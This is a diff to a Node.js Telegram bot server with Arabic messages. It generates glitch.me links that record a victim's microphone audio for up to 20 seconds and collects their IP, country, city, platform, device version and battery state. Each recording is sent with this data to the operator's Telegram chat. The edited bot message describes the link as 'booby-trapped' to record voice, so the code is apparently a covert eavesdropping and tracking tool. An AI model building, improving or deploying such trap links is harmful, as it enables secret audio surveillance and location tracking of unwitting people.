@@ -111,14 +111,14 @@ app.post('/submitVoice', voiceUpload.single('voice'), (req, res) => {
     const additionalData = JSON.parse(req.body.additionalData || '{}');
 
     const caption = `
-معلومات إضافية:
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-إصدار الجهاز: ${additionalData.deviceVersion}
-مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
+    معلومات إضافية:
+    IP: ${additionalData.ip}
+    الدولة: ${additionalData.country}
+    المدينة: ${additionalData.city}
+    المنصة: ${additionalData.platform}
+    إصدار الجهاز: ${additionalData.deviceVersion}
+    مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+    الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
     `;
 
     bot.sendVoice(chatId, voicePath, { caption }).then(() => {
@@ -196,7 +196,7 @@ bot.on('message', (msg) => {
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
             const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
-            bot.sendMessage(chatId, `انقر على الرابط لتسجيل الصوت لمدة ${duration} ثواني: ${link}`);
+            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
